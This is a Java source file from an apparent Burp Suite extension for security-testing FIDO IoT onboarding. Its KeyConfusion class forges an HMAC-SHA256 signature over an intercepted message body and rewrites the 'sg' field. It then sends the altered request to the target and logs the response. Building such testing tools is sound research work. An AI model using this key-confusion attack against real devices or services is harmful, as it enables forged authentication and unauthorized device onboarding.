package src.main.eu.devity.burp.fidoiot.attacks;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import src.main.eu.devity.burp.fidoiot.utilities.Logger;
import burp.IHttpService;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ExecutionException;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.SwingWorker;

public class KeyConfusion {
  
  private final IBurpExtenderCallbacks callbacks;
  private final IExtensionHelpers helpers;
  private IHttpRequestResponse requestResponse;
  private IRequestInfo requestInfo;
  private IResponseInfo responseInfo;
  private IHttpService httpService;
  private static final Logger loggerInstance = Logger.getInstance();
  private byte[] updateMessage;
  AttackExecutor attackRequestExecutor;

    public KeyConfusion(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.requestResponse = message;
        this.requestInfo = helpers.analyzeRequest(message);
        this.httpService = message.getHttpService();
    }

    public byte[] autoAttack(String privKey, String messageBody, boolean proxyVal, String proxyDNS, int proxyPort){

      List<String> headers = requestInfo.getHeaders();
      Integer msgType = 0;
      for(String header : headers){
          if(header.contains("msg/22")){
              msgType = 22;
              break;
          }
          if(header.contains("msg/32")){
              msgType = 32;
              break;
          }
          if(header.contains("msg/44")){
              msgType = 44;
              break;
          }
       }
       
      String signingStr = getBody(messageBody);

      byte[] tempHmac =  hmac256SHAgen(privKey.getBytes(), signingStr.getBytes());
      String signature = Base64.getEncoder().encodeToString(tempHmac); // passed as sg value
      byte[] decoded = Base64.getDecoder().decode(signature);
      String temp1 = String.format("%040x", new BigInteger(1, decoded)); // to calculate length

      int temp;
      String closingTag, newStr;
         if(msgType == 22){
            int tempbod =  messageBody.indexOf("\"sg\""); // there are two bo
            temp =  messageBody.indexOf("\"sg\"", tempbod+1);
            closingTag = "]}}";
         } else {
            temp =  messageBody.indexOf("\"sg\"");
            closingTag = "]}";
         }
         String remainStr = messageBody.substring(temp+6);
         newStr = messageBody.substring(0,temp+6) + temp1.length()  + ",\""+signature+"\"" + closingTag;
         if(proxyVal){
            this.httpService = helpers.buildHttpService(proxyDNS,proxyPort,this.httpService.getProtocol());
        }
        updateMessage = helpers.buildHttpMessage(headers, newStr.getBytes());
        // this.sendAttackReq();

        return updateMessage;

    }

    public void sendAttackReq(){
      loggerInstance.log(getClass(), "Executing Signature Exclusion Attack"  , Logger.LogLevel.INFO);
      attackRequestExecutor = new AttackExecutor(updateMessage);
      attackRequestExecutor.execute();
  }

    public byte[] hmac256SHAgen(byte[] secretKey, byte[] message){
      byte[] hmacSha256 = null;
      try {
        Mac mac = Mac.getInstance("HmacSHA256");
        SecretKeySpec secretKeySpec = new SecretKeySpec(secretKey, "HmacSHA256");
        mac.init(secretKeySpec);
        hmacSha256 = mac.doFinal(message);
        return hmacSha256;
      } catch (Exception e) {
        throw new RuntimeException("Failed to calculate hmac-sha256", e);
        
      }
    }


    private String getBody(String bodyTxt) {
      int tempbod =  bodyTxt.indexOf("\"bo\""); // there are two bo
      int temp =  bodyTxt.indexOf("\"bo\"", tempbod+1);
      String remainStr = bodyTxt.substring(temp+5);
      int tempEnd =  remainStr.indexOf("}");
      String signBody = bodyTxt.substring(temp+5, temp+tempEnd+6);

      return signBody;
  }




  /**
     * Java Swing worker to execute attack in the background
     */


    private class AttackExecutor extends SwingWorker<IHttpRequestResponse, Integer> {
      private byte[] attackRequest;

      AttackExecutor(byte[] attackRequest) {
          this.attackRequest = attackRequest;
      }

      @Override
      // Fire prepared request and return responses as IHttpRequestResponse
      protected IHttpRequestResponse doInBackground() {
          return callbacks.makeHttpRequest(httpService, attackRequest);
      }

      @Override
      // Add response to response list, add new entry to attacker result
      // window table and update process bar
      protected void done() {
          IHttpRequestResponse requestResponse;
          try {
              requestResponse = get();
          } catch (InterruptedException | ExecutionException e) {
              loggerInstance.log(SignatureExcl.class, "Failed to get request result: " + e.getMessage(), Logger.LogLevel.ERROR);
              return;
          }
          // getting message from the response
          String temp = new String(requestResponse.getResponse());
          responseInfo = helpers.analyzeResponse(requestResponse.getResponse());
          String messageBody = temp.substring(responseInfo.getBodyOffset());
          loggerInstance.log(getClass(), "Attack Performed: " +messageBody , Logger.LogLevel.DEBUG);
      }
  }
    
}
